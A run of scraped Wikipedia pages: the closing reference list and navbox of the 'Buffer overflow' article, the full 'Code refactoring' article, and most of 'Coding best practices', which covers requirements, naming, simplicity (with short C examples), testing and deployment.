Computer Security Technology Planning Study, James P. Anderson, ESD-TR-73-51, ESD/AFSC, Hanscom AFB, Bedford, MA 01731 (October 1972) [NTIS AD-758 206]
"Buffer Overflows: Anatomy of an Exploit" by Nevermore
Secure Programming with GCC and GLibc Archived 2008-11-21 at the Wayback Machine (2008), by Marcel Holtmann
"Criação de Exploits com Buffer Overflor – Parte 0 – Um pouco de teoria " (2018), by Helvio Junior (M4v3r1ck)
vteMemory management
Memory management as a function of an operating system
Hardware
Memory management unit (MMU)
Translation lookaside buffer (TLB)
Input–output memory management unit (IOMMU)
Virtual memory
Demand paging
Memory paging
Page table
Virtual memory compression
Memory segmentation
Protected mode
Real mode
Virtual 8086 mode
x86 memory segmentation
Memory allocator
dlmalloc
Hoard
jemalloc
libumem
mimalloc
ptmalloc
Manual memory management
Static memory allocation
C dynamic memory allocation
new and delete (C++)
Garbage collection
Automatic Reference Counting
Boehm garbage collector
Cheney's algorithm
Concurrent mark sweep collector
Finalizer
Garbage
Garbage-first collector
Mark-compact algorithm
Reference counting
Tracing garbage collection
Strong reference
Weak reference
Memory safety
Buffer overflow
Buffer over-read
Dangling pointer
Stack overflow
Issues
Fragmentation
Memory leak
Unreachable memory
Other
Automatic variable
International Symposium on Memory Management
Region-based memory management

 Memory management
 Virtual memory
 Automatic memory management
 Memory management algorithms
 Memory management software

Authority control: National libraries 
Germany





Retrieved from "https://en.wikipedia.org/w/index.php?title=Buffer_overflow&oldid=1135447715"
Categories: Software bugsComputer memoryComputer security exploitsHidden categories: CS1 errors: missing periodicalWebarchive template wayback linksCS1 maint: archived copy as titleArticles with short descriptionShort description is different from WikidataArticles with GND identifiersArticles with example C code
 



From Wikipedia, the free encyclopedia


Restructuring existing computer code without changing its external behavior
"Refactor" redirects here. For the use of "refactor" on Wikipedia, see Wikipedia:Refactoring talk pages.
This article is about a behaviour-preserving change. It is not to be confused with Rewrite (programming).
In computer programming and software design, code refactoring is the process of restructuring existing computer code—changing the factoring—without changing its external behavior. Refactoring is intended to improve the design, structure, and/or implementation of the software (its non-functional attributes), while preserving its functionality. Potential advantages of refactoring may include improved code readability and reduced complexity; these can improve the source code's maintainability and create a simpler, cleaner, or more expressive internal architecture or object model to improve extensibility. Another potential goal for refactoring is improved performance; software engineers face an ongoing challenge to write programs that perform faster or use less memory.
Typically, refactoring applies a series of standardized basic micro-refactorings, each of which is (usually) a tiny change in a computer program's source code that either preserves the behavior of the software, or at least does not modify its conformance to functional requirements. Many development environments provide automated support for performing the mechanical aspects of these basic refactorings. If done well, code refactoring may help software developers discover and fix hidden or dormant bugs or vulnerabilities in the system by simplifying the underlying logic and eliminating unnecessary levels of complexity. If done poorly, it may fail the requirement that external functionality not be changed, and may thus introduce new bugs.

By continuously improving the design of code, we make it easier and easier to work with. This is in sharp contrast to what typically happens: little refactoring and a great deal of attention paid to expediently add new features. If you get into the hygienic habit of refactoring continuously, you'll find that it is easier to extend and maintain code.— Joshua Kerievsky, Refactoring to Patterns[1]

Motivation[edit]
Refactoring is usually motivated by noticing a code smell.[2] For example, the method at hand may be very long, or it may be a near duplicate of another nearby method. Once recognized, such problems can be addressed by refactoring the source code, or transforming it into a new form that behaves the same as before but that no longer "smells".
For a long routine, one or more smaller subroutines can be extracted; or for duplicate routines, the duplication can be removed and replaced with one shared function. Failure to perform refactoring can result in accumulating technical debt; on the other hand, refactoring is one of the primary means of repaying technical debt.[3]

Benefits[edit]
There are two general categories of benefits to the activity of refactoring.

Maintainability. It is easier to fix bugs because the source code is easy to read and the intent of its author is easy to grasp.[4] This might be achieved by reducing large monolithic routines into a set of individually concise, well-named, single-purpose methods. It might be achieved by moving a method to a more appropriate class, or by removing misleading comments.
Extensibility. It is easier to extend the capabilities of the application if it uses recognizable design patterns, and it provides some flexibility where none before may have existed.[1]
Performance engineering can remove inefficiencies in programs, known as software bloat, arising from traditional software-development strategies that aim to minimize an application's development time rather than the time it takes to run. Performance engineering can also tailor software to the hardware on which it runs, for example, to take advantage of parallel processors and vector units.[5]

Challenges[edit]
Refactoring requires extracting software system structure, data models, and intra-application dependencies to get back knowledge of an existing software system.[6]
The turnover of teams implies missing or inaccurate knowledge of the current state of a system and about design decisions made by departing developers. Further code refactoring activities may require additional effort to regain this knowledge.[7]
Refactoring activities generate architectural modifications that deteriorate the structural architecture of a software system. Such deterioration affects architectural properties such as maintainability and comprehensibility which can lead to a complete re-development of software systems.
[8]
Code refactoring activities are secured with software intelligence when using tools and techniques providing data about algorithms and  sequences of code execution.[9] Providing a comprehensible format for the inner-state of software system structure, data models, and intra-components dependencies is a critical element to form a high-level understanding and then refined views of what needs to be modified, and how.[10]

Testing[edit]
Automatic unit tests should be set up before refactoring to ensure routines still behave as expected.[11] Unit tests can bring stability to even large refactors when performed with a single atomic commit. A common strategy to allow safe and atomic refactors spanning multiple projects is to store all projects in a single repository, known as monorepo.[12]
With unit testing in place, refactoring is then an iterative cycle of making a small program transformation, testing it to ensure correctness, and making another small transformation. If at any point a test fails, the last small change is undone and repeated in a different way. Through many small steps the program moves from where it was to where you want it to be. For this very iterative process to be practical, the tests must run very quickly, or the programmer would have to spend a large fraction of their time waiting for the tests to finish. Proponents of extreme programming and other agile software development describe this activity as an integral part of the software development cycle.

Techniques[edit]
Here are some examples of micro-refactorings; some of these may only apply to certain languages or language types. A longer list can be found in Martin Fowler's refactoring book[2][page needed] and website.[13] Many development environments provide automated support for these micro-refactorings. For instance, a programmer could click on the name of a variable and then select the "Encapsulate field" refactoring from a context menu. The IDE would then prompt for additional details, typically with sensible defaults and a preview of the code changes. After confirmation by the programmer it would carry out the required changes throughout the code.

Techniques that allow for more understanding
Program Dependence Graph - explicit representation of data and control dependencies [14]
System Dependence Graph - representation of procedure calls between PDG [15]
Software intelligence - reverse engineers the initial state to understand existing intra-application dependencies
Techniques that allow for more abstraction
Encapsulate field – force code to access the field with getter and setter methods
Generalize type – create more general types to allow for more code sharing
Replace type-checking code with state/strategy[16]
Replace conditional with polymorphism[17]
Techniques for breaking code apart into more logical pieces
Componentization breaks code down into reusable semantic units that present clear, well-defined, simple-to-use interfaces.
Extract class moves part of the code from an existing class into a new class.
Extract method, to turn part of a larger method into a new method. By breaking down code in smaller pieces, it is more easily understandable. This is also applicable to functions.
Techniques for improving names and location of code
Move method or move field – move to a more appropriate class or source file
Rename method or rename field – changing the name into a new one that better reveals its purpose
Pull up – in object-oriented programming (OOP), move to a superclass
Push down – in OOP, move to a subclass[13]
Automatic clone detection[18]
Hardware refactoring[edit]
While the term refactoring originally referred exclusively to refactoring of software code, in recent years code written in hardware description languages has also been refactored. The term hardware refactoring is used as a shorthand term for refactoring of code in hardware description languages. Since hardware description languages are not considered to be programming languages by most hardware engineers,[19] hardware refactoring is to be considered a separate field from traditional code refactoring.
Automated refactoring of analog hardware descriptions (in VHDL-AMS) has been proposed by Zeng and Huss.[20] In their approach, refactoring preserves the simulated behavior of a hardware design. The non-functional measurement that improves is that refactored code can be processed by standard synthesis tools, while the original code cannot. Refactoring of digital hardware description languages, albeit manual refactoring, has also been investigated by Synopsys fellow Mike Keating.[21][22] His target is to make complex systems easier to understand, which increases the designers' productivity.

History[edit]
The first known use of the term "refactoring" in the published literature was in a September, 1990 article by William Opdyke and Ralph Johnson.[23]
Griswold's Ph.D. thesis,[24]
Opdyke's Ph.D. thesis,[25] published in 1992, also used this term.[26] Although refactoring code has been done informally for decades, William Griswold's 1991 Ph.D. dissertation[24] is one of the first major academic works on refactoring functional and procedural programs, followed by William Opdyke's 1992 dissertation[25] on the refactoring of object-oriented programs,[26] although all the theory and machinery have long been available as program transformation systems. All of these resources provide a catalog of common methods for refactoring; a refactoring method has a description of how to apply the method and indicators for when you should (or should not) apply the method.
Martin Fowler's book Refactoring: Improving the Design of Existing Code is the canonical reference.[according to whom?]
The terms "factoring" and "factoring out" have been used in this way in the Forth community since at least the early 1980s. Chapter Six of Leo Brodie's book Thinking Forth (1984)[27] is dedicated to the subject.
In extreme programming, the Extract Method refactoring technique has essentially the same meaning as factoring in Forth; to break down a "word" (or function) into smaller, more easily maintained functions.
Refactorings can also be reconstructed[28] posthoc to produce concise descriptions of complex software changes recorded in software repositories like CVS or SVN.

Automated code refactoring[edit]
This section needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Code refactoring" – news · newspapers · books · scholar · JSTOR (July 2018) (Learn how and when to remove this template message)
Many software editors and IDEs have automated refactoring support.  Here is a list of a few of these editors, or so-called refactoring browsers.

DMS Software Reengineering Toolkit (Implements large-scale refactoring for C, C++, C#, COBOL, Java, PHP and other languages)
Eclipse based:
Eclipse (for Java, and to a lesser extent, C++, PHP, Ruby and JavaScript)
PyDev (for Python)
Photran (a Fortran plugin for the Eclipse IDE)
Embarcadero Delphi
IntelliJ based:
Resharper (for C#)
AppCode (for Objective-C, C and C++)
IntelliJ IDEA (for Java)
PyCharm (for Python)
WebStorm (for JavaScript)
PhpStorm (for PHP)
Android Studio (for Java and C++)
JDeveloper (for Java)
NetBeans (for Java)
Smalltalk: Most dialects include powerful refactoring tools. Many use the original refactoring browser produced in the early '90s by Ralph Johnson.
Visual Studio based:
Visual Studio (for .NET and C++)
CodeRush (addon for Visual Studio)
Visual Assist (addon for Visual Studio with refactoring support for C# and C++)
Wing IDE (for Python)
Xcode (for C, Objective-C, and Swift)[29]
Qt Creator (for C++, Objective-C and QML)[30]
See also[edit]
Amelioration pattern
Code review
Database refactoring
Decomposition (computer science)
Modular programming
Obfuscated code
Prefactoring
Separation of concerns
Software peer review
Test-driven development
References[edit]


^ a b Kerievsky, Joshua (2004). Refactoring to Patterns. Addison Wesley.

^ a b Fowler, Martin (1999). Refactoring. Improving the Design of Existing Code. Addison-Wesley. pp. 63ff. ISBN 978-0-201-48567-7.

^ Suryanarayana, Girish (November 2014). Refactoring for Software Design Smells. Morgan Kaufmann. p. 258. ISBN 978-0128013977.

^ Martin, Robert (2009). Clean Code. Prentice Hall.

^ Leiserson, Charles E.; Thompson, Neil C.; Emer, Joel S.; Kuszmaul, Bradley C.; Lampson, Butler W.; Sanchez, Daniel; Schardl, Tao B. (2020). "There's plenty of room at the Top: What will drive computer performance after Moore's law?". Science. 368 (6495): eaam9744. doi:10.1126/science.aam9744. PMID 32499413.

^ 
Haendler, Thorsten; Neumann, Gustaf (2019). "A Framework for the Assessment and Training of Software Refactoring Competences". Proc. Of 11th International Conference on Knowledge Management and Information Systems (KMIS).: 307–316. doi:10.5220/0008350803070316. ISBN 978-989-758-382-7. S2CID 204754665.

^ 
Nassif, Matthieu; Robillard, Martin P. (November 2017). "Revisiting turnover-induced knowledge loss in software projects". 2017 IEEE International Conference on Software Maintenance and Evolution (ICSME): 261–272. doi:10.1109/ICSME.2017.64. ISBN 978-1-5386-0992-7. S2CID 13147063.

^ 
van Gurp, Jilles; Bosch, Jan (March 2002). "Design erosion: problems and causes". Journal of Systems and Software. 61 (2): 105–119. doi:10.1016/S0164-1212(01)00152-2.

^ 
Hassan, Ahmed E.; Xie, Tao (November 2010). "Software intelligence: the future of mining software engineering data". In Proceedings of the FSE/SDP Workshop on Future of Software Engineering Research (FoSER '10): 161–166. doi:10.1145/1882362.1882397. S2CID 3485526.

^ 
Novais, Renato; Santos, José Amancio; Mendonça, Manoel (2017). "Experimentally assessing the combination of multiple visualization strategies for software evolution analysis". Journal of Systems and Software. 128: 56–71. doi:10.1016/j.jss.2017.03.006.

^ Fowler, Martin (1999). Refactoring : improving the design of existing code. Reading, MA: Addison-Wesley. ISBN 978-0201485677. OCLC 41017370.

^ Smart, John Ferguson (2008). Java Power Tools. "O'Reilly Media, Inc.". p. 301. ISBN 9781491954546. Retrieved 26 July 2018.

^ a b (these are only about OOP however).Refactoring techniques in Fowler's refactoring Website

^ 
Ferrante, Jeanne; Ottenstein, Karl J.; Warren, Joe D. (July 1987). "The program dependence graph and its use in optimization". ACM Transactions on Programming Languages and Systems. ACM. 9 (3): 319–349. doi:10.1145/24039.24041. S2CID 505075.

^ 
Donglin, Linag; Harrold, M. J. (November 2008). "Slicing objects using system dependence graphs". Proceedings. International Conference on Software Maintenance. IEEE: 319–349. doi:10.1109/ICSM.1998.738527. ISBN 978-0-8186-8779-2. S2CID 18160599.

^ "Replace type-checking code with State/Strategy".

^ "Replace conditional with polymorphism".

^ Bruntink, Magiel, et al. "An evaluation of clone detection techniques for crosscutting concerns." Software Maintenance, 2004. Proceedings. 20th IEEE International Conference on. IEEE, 2004.

^ Hardware description languages#HDL and programming languages

^ Kaiping Zeng, Sorin A. Huss, "Architecture refinements by code refactoring of behavioral VHDL-AMS models". ISCAS 2006

^ M. Keating :"Complexity, Abstraction, and the Challenges of Designing Complex Systems", in DAC'08 tutorial [1] Archived 2016-03-28 at the Wayback Machine"Bridging a Verification Gap: C++ to RTL for Practical Design"

^ M. Keating, P. Bricaud: Reuse Methodology Manual for System-on-a-Chip Designs, Kluwer Academic Publishers, 1999.

^ Opdyke, William F.; Johnson, Ralph E. (September 1990). "Refactoring: An Aid in Designing Application Frameworks and Evolving Object-Oriented Systems". Proceedings of the Symposium on Object Oriented Programming Emphasizing Practical Applications (SOOPPA). ACM.

^ a b Griswold, William G (July 1991). Program Restructuring as an Aid to Software Maintenance (PDF) (Ph.D. thesis). University of Washington. Retrieved 2011-12-24.

^ a b Opdyke, William F (June 1992). Refactoring Object-Oriented Frameworks (Ph.D. thesis). University of Illinois at Urbana-Champaign. Archived from the original (compressed Postscript) on 2019-12-16. Retrieved 2008-02-12.

^ a b "Martin Fowler, "MF Bliki: EtymologyOfRefactoring"".

^ Brodie, Leo (2004). Thinking Forth. pp. 171–196. ISBN 0-9764587-0-5. Archived from the original on 16 December 2005. Retrieved 3 May 2020.

^ Sokolov, Andriy. "What is code refactoring?".

^ "What's new in Xcode 9".

^ "Refactoring in Qt Creator".


Further reading[edit]
Wake, William C. (2003). Refactoring Workbook. Addison-Wesley. ISBN 978-0-321-10929-3.
Mens, T.; Tourwe, T. (February 2004). "A survey of software refactoring". IEEE Transactions on Software Engineering. 30 (2): 126–139. doi:10.1109/tse.2004.1265817. ISSN 0098-5589. S2CID 206778272.
Feathers, Michael C (2004). Working Effectively with Legacy Code. Prentice Hall. ISBN 978-0-13-117705-5.
Kerievsky, Joshua (2004). Refactoring To Patterns. Addison-Wesley. ISBN 978-0-321-21335-8.
Arsenovski, Danijel (2008). Professional Refactoring in Visual Basic. Wrox. ISBN 978-0-470-17979-6.
Arsenovski, Danijel (2009). Professional Refactoring in C# and ASP.NET. Wrox. ISBN 978-0-470-43452-9.
Ritchie, Peter (2010). Refactoring with Visual Studio 2010. Packt. ISBN 978-1-84968-010-3.
External links[edit]
What Is Refactoring? (c2.com article)
Martin Fowler's homepage about refactoring
Refactoring at Curlie
Authority control National libraries
Germany
Israel
United States
Japan
Czech Republic
Other
FAST





Retrieved from "https://en.wikipedia.org/w/index.php?title=Code_refactoring&oldid=1135947171"
Categories: Code refactoringExtreme programmingTechnology neologismsHidden categories: Webarchive template wayback linksArticles with short descriptionShort description is different from WikidataWikipedia articles needing page number citations from July 2018All articles with specifically marked weasel-worded phrasesArticles with specifically marked weasel-worded phrases from July 2018Articles needing additional references from July 2018All articles needing additional referencesArticles with Curlie linksArticles with GND identifiersArticles with J9U identifiersArticles with LCCN identifiersArticles with NDL identifiersArticles with NKC identifiersArticles with FAST identifiers
 



From Wikipedia, the free encyclopedia


This article has multiple issues. Please help improve it or discuss these issues on the talk page. (Learn how and when to remove these template messages)

This article includes a list of general references, but it lacks sufficient corresponding inline citations. Please help to improve this article by introducing more precise citations. (July 2012) (Learn how and when to remove this template message)
This article's tone or style may not reflect the encyclopedic tone used on Wikipedia. See Wikipedia's guide to writing better articles for suggestions. (March 2008) (Learn how and when to remove this template message)

 (Learn how and when to remove this template message)
Coding best practices or programming best practices are a set of informal rules (best practices) that many software developers in computer programming follow to improve software quality.[1]
Many computer programs remain in use for long periods of time,[2] so any rules need to facilitate both initial development and subsequent maintenance and enhancement of source code by people other than the original authors.
In the ninety-ninety rule, Tom Cargill is credited with an explanation as to why programming projects often run late:   "The first 90% of the code accounts for the first 90% of the development time. The remaining 10% of the code accounts for the other 90% of the development time." Any guidance which can redress this lack of foresight is worth considering.
The size of a project or program has a significant effect on error rates, programmer productivity, and the amount of management needed.[3]


Software quality[edit]
Main article: Software quality
As listed below, there are many attributes associated with good software. Some of these can be mutually contradictory (e.g. being very fast versus performing extensive error checking), and different customers and participants may have different priorities. Weinberg provides an example of how different goals can have a dramatic effect on both effort required and efficiency.[4] Furthermore, he notes that programmers will generally aim to achieve any explicit goals which may be set, probably at the expense of any other quality attributes.
Sommerville has identified four generalized attributes which are not concerned with what a program does, but how well the program does it:[5]

Maintainability
Dependability
Efficiency
Usability
Weinberg has identified four targets which a good program should meet:[6]

Does a program meet its specification ("correct output for each possible input")?
Is the program produced on schedule (and within budget)?
How adaptable is the program to cope with changing requirements?
Is the program efficient enough for the environment in which it is used?
Hoare has identified seventeen objectives related to software quality, including:[7]

Clear definition of purpose.
Simplicity of use.
Ruggedness (difficult to misuse, kind to errors).
Early availability (delivered on time when needed).
Reliability.
Extensibility in the light of experience.
Brevity.
Efficiency (fast enough for the purpose to which it is put).
Minimum cost to develop.
Conformity to any relevant standards.
Clear, accurate and precise user documents.
Prerequisites[edit]
Before coding starts, it is important to ensure that all necessary prerequisites have been completed (or have at least progressed far enough to provide a solid foundation for coding). If the various prerequisites are not satisfied, then the software is likely to be unsatisfactory, even if it is completed.
From Meek & Heath: "What happens before one gets to the coding stage is often of crucial importance to the success of the project."[8]
The prerequisites outlined below cover such matters as:

how is development structured? (life cycle)
what is the software meant to do? (requirements)
the overall structure of the software system (architecture)
more detailed design of individual components (design)
choice of programming language(s)
For small simple projects involving only one person, it may be feasible to combine architecture with design and adopt a very simple life cycle.

Life cycle[edit]
Main article: Software development methodology
A software development methodology is a framework that is used to structure, plan, and control the life cycle of a software product. Common methodologies include waterfall, prototyping, iterative and incremental development, spiral development, agile software development, rapid application development, and extreme programming.
The waterfall model is a sequential development approach; in particular, it assumes that the requirements can be completely defined at the start of a project. However, McConnell quotes three studies that indicate that, on average, requirements change by around 25% during a project.[9] The other methodologies mentioned above all attempt to reduce the impact of such requirement changes, often by some form of step-wise, incremental, or iterative approach. Different methodologies may be appropriate for different development environments.

Requirements[edit]
Main article: Requirements engineering
McConnell states: "The first prerequisite you need to fulfill before beginning construction is a clear statement of the problem the system is supposed to solve."[10]
Meek and Heath emphasise that a clear, complete, precise, and unambiguous written specification is the target to aim for.[11] Note that it may not be possible to achieve this target, and the target is likely to change anyway (as mentioned in the previous section).
Sommerville distinguishes between less detailed user requirements and more detailed system requirements.[12] He also distinguishes between functional requirements (e.g. update a record) and non-functional requirements (e.g. response time must be less than 1 second).

Architecture[edit]
Main article: Software architecture
Hoare points out: "there are two ways of constructing a software design: one way is to make it so simple that there are obviously no deficiencies; the other way is to make it so complicated that there are no obvious deficiencies. The first method is far more difficult."[13]
Software architecture is concerned with deciding what has to be done and which program component is going to do it (how something is done is left to the detailed design phase below). This is particularly important when a software system contains more than one program since it effectively defines the interface between these various programs. It should include some consideration of any user interfaces as well, without going into excessive detail.
Any non-functional system requirements (response time, reliability, maintainability, etc.) need to be considered at this stage.[14]
The software architecture is also of interest to various stakeholders (sponsors, end-users, etc.) since it gives them a chance to check that their requirements can be met.

Design[edit]
Main article: Software design
The primary purpose of design is to fill in the details which have been glossed over in the architectural design. The intention is that the design should be detailed enough to provide a good guide for actual coding, including details of any particular algorithms to be used. For example, at the architectural level, it may have been noted that some data has to be sorted, while at the design level, it is necessary to decide which sorting algorithm is to be used. As a further example, if an object-oriented approach is being used, then the details of the objects must be determined (attributes and methods).

Choice of programming language(s)[edit]
Mayer states: "No programming language is perfect. There is not even a single best language; there are only languages well suited or perhaps poorly suited for particular purposes.  Understanding the problem and associated programming requirements is necessary for choosing the language best suited for the solution."[15]
From Meek & Heath: "The essence of the art of choosing a language is to start with the problem, decide what its requirements are, and their relative importance since it will probably be impossible to satisfy them all equally well. The available languages should then be measured against the list of requirements, and the most suitable (or least unsatisfactory) chosen."[16]
It is possible that different programming languages may be appropriate for different aspects of the problem. If the languages or their compilers permit, it may be feasible to mix routines written in different languages within the same program.
Even if there is no choice as to which programming language is to be used, McConnell provides some advice: "Every programming language has strengths and weaknesses. Be aware of the specific strengths and weaknesses of the language you're using."[17]

Coding standards[edit]
Main article: Coding conventions
This section is also really a prerequisite to coding, as McConnell points out: "Establish programming conventions before you begin programming.  It's nearly impossible to change code to match them later."[17]
As listed near the end of Coding conventions, there are different conventions for different programming languages, so it may be counterproductive to apply the same conventions across different languages. It is important to note that there is no one particular coding convention for any programming language. Every organization has a custom coding standard for each type of software project. It is, therefore, imperative that the programmer chooses or makes up a particular set of coding guidelines before the software project commences. Some coding conventions are generic, which may not apply for every software project written with a particular programming language.
The use of coding conventions is particularly important when a project involves more than one programmer (there have been projects with thousands of programmers). It is much easier for a programmer to read code written by someone else if all code follows the same conventions.
For some examples of bad coding conventions, Roedy Green provides a lengthy (tongue-in-cheek) article on how to produce unmaintainable code.[18]

Commenting[edit]
Due to time restrictions or enthusiastic programmers who want immediate results for their code, commenting of code often takes a back seat.  Programmers working as a team have found it better to leave comments behind since coding usually follows cycles, or more than one person may work on a particular module. However, some commenting can decrease the cost of knowledge transfer between developers working on the same module.
In the early days of computing, one commenting practice was to leave a brief description of the following:

Name of the module
Purpose of the Module
Description of the Module
Original Author
Modifications
Authors who modified code with a description on why it was modified.
The "description of the module" should be as brief as possible but without sacrificing clarity and comprehensiveness.
However, the last two items have largely been obsoleted by the advent of revision control systems. Modifications and their authorship can be reliably tracked by using such tools rather than by using comments.
Also, if complicated logic is being used, it is a good practice to leave a comment "block" near that part so that another programmer can understand what exactly is happening.
Unit testing can be another way to show how code is intended to be used.

Naming conventions[edit]
See also: Hungarian notation
Use of proper naming conventions is considered good practice. Sometimes programmers tend to use X1, Y1, etc. as variables and forget to replace them with meaningful ones, causing confusion.
It is usually considered good practice to use descriptive names.
Example: A variable for taking in weight as a parameter for a truck can be named TrkWeight or TruckWeightKilograms, with TruckWeightKilograms being the preferable one since it is instantly recognisable. See CamelCase naming of variables.

Keep the code simple[edit]
The code that a programmer writes should be simple. Complicated logic for achieving a simple thing should be kept to a minimum since the code might be modified by another programmer in the future. The logic one programmer implemented may not make perfect sense to another. So, always keep the code as simple as possible.[19]
For example, consider these equivalent lines of C code:

if (hours < 24 && minutes < 60 && seconds < 60)
{
    return true;
}
else
{
    return false;
}

and

if (hours < 24 && minutes < 60 && seconds < 60)
    return true;
else
    return false;

and

switch (hours < 24 && minutes < 60 && seconds < 60){
    case true:
        return true;
    break;
    case false:
        return false;
    break;
    default:
        return false;
}

and

return hours < 24 && minutes < 60 && seconds < 60;

The 1st approach, which is much more commonly used[dubious  – discuss], is considerably larger than the 4th. In particular, it consumes 5 times more screen vertical space (lines), and 97 characters versus 52 (though editing tools may reduce the difference in actual typing). It is arguable, however, which is "simpler". The first has an explicit if/then else, with an explicit return value obviously connected with each; even a novice programmer should have no difficulty understanding it. The 2nd merely discards the braces, cutting the "vertical" size in half with little change in conceptual complexity. In most languages, the "return" statements could also be appended to the prior lines, bringing the "vertical" size to only one more line than the 4th form.
The fourth form obviously minimizes the size but may increase the complexity: It leaves the "true" and "false" values implicit, and intermixes the notions of "condition" and "return value". It is likely obvious to most programmers, but a novice might not immediately understand that the result of evaluating a condition is actually a value (of type Boolean or its equivalent in whatever language), and thus can be manipulated or returned. In more realistic examples, the 4th form could have problems due to operator precedence, perhaps returning an unexpected type, where the prior forms would, in some languages, report an error. Thus, "simplicity" is not merely a matter of length, but of logical and conceptual structure; making code shorter may make it less or more complex.
For large, long lived programs using verbose alternatives could contribute to bloat.[dubious  – discuss]
Compactness can allow coders to view more code per page, reducing scrolling gestures and keystrokes. Given how many times code might be viewed in the process of writing and maintaining, it might amount to a significant savings in programmer keystrokes in the life of the code. This might not seem significant to a student first learning to program but, when producing and maintaining large programs the reduction of how many lines of code there are allows for more of the code to fit on screen, minor code simplification may improve productivity[dubious  – discuss], and also lessen finger, wrist and eye strain, which are common medical issues suffered by production coders and information workers.[20]
Terser coding speeds compilation very slightly, as fewer symbols need to be processed. Furthermore, the 3rd approach may allow similar lines of code to be more easily compared, particularly when many such constructs can appear on one screen at the same time.
Finally, very terse layouts may better utilize modern wide-screen computer displays, depending on monitor layout and setup. In the past, screens were limited to 40 or 80 characters (such limits originated far earlier: manuscripts, printed books, and even scrolls, have for millennia used quite short lines (see for example Gutenberg Bible). Modern screens can easily display 200 or more characters, allowing extremely long lines. Most modern coding styles and standards do not take up that entire width. Thus, if using one window as wide as the screen, a great deal of available space is wasted. On the other hand, with multiple windows, or using an IDE or other tool with various information in side panes, the available width for code is in the range familiar from earlier systems.
It is also worth noting that the human visual system is greatly affected by line length; very long lines slightly increase reading speed, but reduce comprehension Text Columns: How Long is Too Long? and add to eye-tracking errors. Some studies suggest that longer lines fare better online than in print Human Factors International, but this still only goes up to about 10 inches, and mainly for raw speed of reading prose.

Portability[edit]
Program code should not contain "hard-coded" (literal) values referring to environmental parameters, such as absolute file paths, file names, user names, host names, IP addresses, and URLs, UDP/TCP ports. Otherwise, the application will not run on a host that has a different design than anticipated. A careful programmer can parametrize such variables and configure them for the hosting environment outside of the application proper (for example, in property files, on an application server, or even in a database). Compare the mantra of a "single point of definition"[21]
(SPOD).
As an extension, resources such as XML files should also contain variables rather than literal values, otherwise, the application will not be portable to another environment without editing the XML files. For example, with J2EE applications running in an application server, such environmental parameters can be defined in the scope of the JVM, and the application should get the values from there.

Scalability[edit]
Design code with scalability as a design goal because very often in software projects, new features are always added to a project which becomes bigger. Therefore, the facility to add new features to a software code base becomes an invaluable method in writing software.

Reusability[edit]
Re-use is a very important design goal in software development. Re-use cuts development costs and also reduces the time for development if the components or modules which are reused are already tested. Very often, software projects start with an existing baseline that contains the project in its prior version and depending on the project, many of existing software modules and components are reused, which reduces development and testing time, therefore, increasing the probability of delivering a software project on schedule.

Construction guidelines in brief[edit]
A general overview of all of the above:

Know what the code block must perform
Maintain naming conventions which are uniform throughout.
Indicate a brief description of what a variable is for (reference to commenting)
Correct errors as they occur.
Keep your code simple
Design code with scalability and reuse in mind.
Code development[edit]
Code building[edit]
A best practice for building code involves daily builds and testing, or better still continuous integration, or even continuous delivery.

Testing[edit]
Main article: Software testing
Testing is an integral part of software development that needs to be planned. It is also important that testing is done proactively; meaning that test cases are planned before coding starts, and test cases are developed while the application is being designed and coded.

Debugging the code and correcting errors[edit]
Programmers tend to write the complete code and then begin debugging and checking for errors. Though this approach can save time in smaller projects, bigger and more complex ones tend to
have too many variables and functions that need attention. Therefore, it is good to debug every module once you are done and not the entire program. This saves time in the long run so that one does not end up wasting a lot of time on figuring out what is wrong. Unit tests for individual modules and/or functional tests for web services and web applications can help with this.

Deployment[edit]
Main articles: Software deployment and Deployment environment
Deployment is the final stage of releasing an application for users. Some best practices are:[22][23]

Keep the installation structure simple: Files and directories should be kept to a minimum. Don’t install anything that’s never going to be used.
Keep only what is needed: The software configuration management activities must make sure this is enforced. Unused resources (old or failed versions of files, source code, interfaces, etc.) must be archived somewhere else to keep newer builds lean.
Keep everything updated: The software configuration management activities must make sure this is enforced. For delta-based deployments, make sure the versions of the resources that are already deployed are the latest before deploying the deltas. If not sure, perform a deployment from scratch (delete everything first and then re-deploy).
Adopt a multi-stage strategy: Depending on the size of the project, sometimes more deployments are needed.[24]
Have a roll back strategy: There must be a way to roll-back to a previous (working) version.
Rely on automation for repeatable processes: There's far too much room for human error, deployments should not be manual. Use a tool that is native to each operating system or, use a scripting language for cross-platform deployments.[25][26]
Re-create the real deployment environment: Consider everything (routers, firewalls, web servers, web browsers, file systems, etc.)
Do not change deployment procedures and scripts on-the-fly and, document such changes: Wait for a new iteration and record such changes appropriately.
Customize deployment: Newer software products such as APIs, micro-services, etc. require specific considerations for successful deployment.[27][28][29]
Reduce risk from other development phases: If other activities such as testing and configuration management are wrong, deployment surely will fail.[30][31]
Consider the influence each stakeholder has: Organizational, social, governmental considerations.[32][33][34]
See also[edit]
Best practice
List of tools for static code analysis
Motor Industry Software Reliability Association (MISRA)
Software Assurance
Software quality
List of software development philosophies
The Cathedral and the Bazaar - book comparing top-down vs. bottom-up open-source software
Davis 201 Principles of Software Development[35]
Where's the Theory for Software Engineering?[36]
Don't Make Me Think (Principles of intuitive navigation and information design)[37]
References[edit]


^ McConnell, Steve (2004). Code Complete (Second ed.). Microsoft Press. ISBN 0-7356-1967-0.

^ Sommerville, Ian (2004). Software Engineering (Seventh ed.). Pearson. p. 38. ISBN 0-321-21026-3.

^ McConnell, Steve (2004). Code Complete (Second ed.). Microsoft Press. pp. 649–659. ISBN 0-7356-1967-0.

^ Weinberg, Gerald (1998). The Psychology of Computer Programming (Silver anniversary ed.). Dorset House Publishing, New York. pp. 128–132. ISBN 978-0-932633-42-2.

^ Sommerville, Ian (2004). Software Engineering (Seventh ed.). Pearson. pp. 12–13. ISBN 0-321-21026-3.

^ Weinberg, Gerald (1998). The Psychology of Computer Programming (Silver anniversary ed.). Dorset House Publishing, New York. pp. 15–25. ISBN 978-0-932633-42-2.

^ Hoare, C.A.R. (1972). "The Quality of Software". Software: Practice and Experience. Wiley. 2 (2): 103–105. doi:10.1002/spe.4380020202.

^ Meek, Brian; Heath, Patricia (1980), Guide to Good Programming Practice, Ellis Horwood, Wiley, p. 14

^ McConnell, Steve (2004). Code Complete (Second ed.). Microsoft Press. p. 40. ISBN 0-7356-1967-0.

^ McConnell, Steve (2004). Code Complete (Second ed.). Microsoft Press. p. 36. ISBN 0-7356-1967-0.

